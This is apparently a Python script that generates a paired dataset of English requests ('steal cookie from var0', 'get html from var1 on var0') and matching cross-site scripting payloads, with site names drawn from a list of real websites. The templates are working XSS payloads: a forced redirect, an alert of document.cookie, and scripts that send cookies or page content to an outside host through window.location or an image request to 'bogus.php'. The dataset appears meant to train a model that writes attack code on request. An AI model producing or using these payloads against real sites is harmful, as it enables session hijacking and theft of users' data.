import random
import requests

redirect_arr = ['redirect script to var0', 'script redirect to var0', 'redirect to var0']
redirect_arr_code = '<script>window.location="https://www.var0"</script>'
cookie_arr = ['print cookie from user at var0', 'alert cookie from user at the url var0', 'print cookie from var0']
cookie_code_arr = 'https://www.var0/welcome.html?name=<script>alert(document.cookie)</script>'
cookie_arr_2 = ['steal cookie from var0', 'find cookie in var0', 'get cookie from var0', 'store cookie from var0']
cookie_code_arr_2 = '<script>window.location=\'http://www.var0/?cookie=\'+document.cookie</script>'
cookie_arr_3 = ['steal cookie with image source var0', 'get cookie through image source var0', 'get cookie through image at var0', 'get cookie with image redirect to var0', 'send cookie to var0 through image', 'send cookie to var0 with image']
cookie_code_arr_3 = '<script>new Image().src="http://www.var0/bogus.php?output="+document.cookie;</script>'
get_html_id = ['get html from var1 on var0', 'on var0 get html in var1', 'get html code of var1 at var0', 'go to var0 and get html from var1', 'go to var0 and get html from element var1']
get_html_id_code = '<script>new Image().src="http://www.var0/bogus.php?output="+document.getElementById(\'var1\').innerHTML;</script>'
all_intents = [redirect_arr, cookie_arr, cookie_arr_2, cookie_arr_3, get_html_id]
all_snippet = [redirect_arr_code, cookie_code_arr, cookie_code_arr_2, cookie_code_arr_3, get_html_id_code]
websites_all = []
websites = []
intent_arr = []
snippet_arr = []
file_to_list = []
filename = 'websites-1000.txt'

word_site = "http://svnweb.freebsd.org/csrg/share/dict/words?view=co&content-type=text/plain"
js_keywords = ['break','byte','case','catch','char','class','const','continue','debugger','default','delete','do','double','else','enum','eval','export','extends','false','final','finally','float','for','function','goto','if','implements','import','in','instanceof','int','interface','let','long','native','new','null','package','private','protected','public','return','short','static','super','switch','synchronized','this','throw','throws','transient','true','try','typeof','var','void','volatile','while','with','yield']
response = requests.get(word_site)
WORDS = response.content.splitlines()
alpha = 'abcdefghijklmnopqrstuvwxyz'
illegal = ['~', ':', "'", '+', '[', '\\', '@', '^', '{', '%', '(', '-', '"', '*', '|', ',', '&', '<', '`', '}', '.', '_', '=', ']', '!', '>', ';', '?', '#', '$', ')', '/']
def get_word():
    while True:
        index = random.randint(0, len(WORDS) - 1)
        response = WORDS[index].decode('UTF-8')
        del WORDS[index]
        if bool([ele for ele in illegal if(ele in response)]):
            continue
        if ' ' in response:
            continue
        if response[0].lower() not in alpha and response[0] != '_':
            continue
        if response in js_keywords:
            continue
        return response

with open(filename) as f:
    file_to_list = f.read().splitlines()
for i in range(len(file_to_list)):
    line = str(file_to_list[i])
    if 'https://www.' in line:
        line = line.replace('https://www.', '')
    if 'http://www.' in line:
        line = line.replace('http://www.', '')
    split_str = line.split('.', 1)
    websites_all.append(split_str[0])

for i in range(2):
    selected_website = random.choice(websites_all)
    websites.append(selected_website)
for i in range(len(websites)):
    website = websites[i]
    dot_com = website + '.com'
    dot_edu = website + '.edu'
    dot_net = website + '.net'
    dot_org = website + '.org'
    dot_tv = website + '.tv'
    dot_info = website + '.info'
    dot_co = website + '.co'
    dot_gov = website + '.gov'
    for j in range(len(all_intents)):
        for k in range(len(all_intents[j])):
            var1_flag = False
            word = ''
            if 'var1' in all_snippet[j]:
                var1_flag = True
                word = get_word()
            intent_val = all_intents[j][k]
            snippet_val = all_snippet[j]
            if var1_flag:
                intent_arr.append(intent_val.replace('var1', word).replace('var0', website))
                snippet_arr.append(snippet_val.replace('var1', word).replace('var0', website+'.com'))
            else:
                intent_arr.append(intent_val.replace('var0', website))
                snippet_arr.append(snippet_val.replace('var0', website+'.com'))

            intent_val = all_intents[j][k]
            snippet_val = all_snippet[j]
            if var1_flag:
                intent_arr.append(intent_val.replace('var1', word).replace('var0', dot_com))
                snippet_arr.append(snippet_val.replace('var1', word).replace('var0', dot_com))
            else:
                intent_arr.append(intent_val.replace('var0', dot_com))
                snippet_arr.append(snippet_val.replace('var0', dot_com))

            intent_val = all_intents[j][k]
            snippet_val = all_snippet[j]
            if var1_flag:
                intent_arr.append(intent_val.replace('var1', word).replace('var0', dot_net))
                snippet_arr.append(snippet_val.replace('var1', word).replace('var0', dot_net))
            else:
                intent_arr.append(intent_val.replace('var0', dot_net))
                snippet_arr.append(snippet_val.replace('var0', dot_net))

            intent_val = all_intents[j][k]
            snippet_val = all_snippet[j]
            if var1_flag:
                intent_arr.append(intent_val.replace('var1', word).replace('var0', dot_org))
                snippet_arr.append(snippet_val.replace('var1', word).replace('var0', dot_org))
            else:
                intent_arr.append(intent_val.replace('var0', dot_org))
                snippet_arr.append(snippet_val.replace('var0', dot_org))

            intent_val = all_intents[j][k]
            snippet_val = all_snippet[j]
            if var1_flag:
                intent_arr.append(intent_val.replace('var1', word).replace('var0', dot_tv))
                snippet_arr.append(snippet_val.replace('var1', word).replace('var0', dot_tv))
            else:
                intent_arr.append(intent_val.replace('var0', dot_tv))
                snippet_arr.append(snippet_val.replace('var0', dot_tv))

            intent_val = all_intents[j][k]
            snippet_val = all_snippet[j]
            if var1_flag:
                intent_arr.append(intent_val.replace('var1', word).replace('var0', dot_info))
                snippet_arr.append(snippet_val.replace('var1', word).replace('var0', dot_info))
            else:
                intent_arr.append(intent_val.replace('var0', dot_info))
                snippet_arr.append(snippet_val.replace('var0', dot_info))

            intent_val = all_intents[j][k]
            snippet_val = all_snippet[j]
            if var1_flag:
                intent_arr.append(intent_val.replace('var1', word).replace('var0', dot_co))
                snippet_arr.append(snippet_val.replace('var1', word).replace('var0', dot_co))
            else:
                intent_arr.append(intent_val.replace('var0', dot_co))
                snippet_arr.append(snippet_val.replace('var0', dot_co))

            intent_val = all_intents[j][k]
            snippet_val = all_snippet[j]
            if var1_flag:
                intent_arr.append(intent_val.replace('var1', word).replace('var0', dot_gov))
                snippet_arr.append(snippet_val.replace('var1', word).replace('var0', dot_gov))
            else:
                intent_arr.append(intent_val.replace('var0', dot_gov))
                snippet_arr.append(snippet_val.replace('var0', dot_gov))


if len(intent_arr) == len(snippet_arr):
    with open("intent-xss-high.txt", "w") as output:
        output.writelines("%s\n" % i for i in intent_arr)
    with open("snippet-xss-high.txt", "w") as output:
        output.writelines("%s\n" % i for i in snippet_arr)
else:
    print('intents and snippets are not the same size')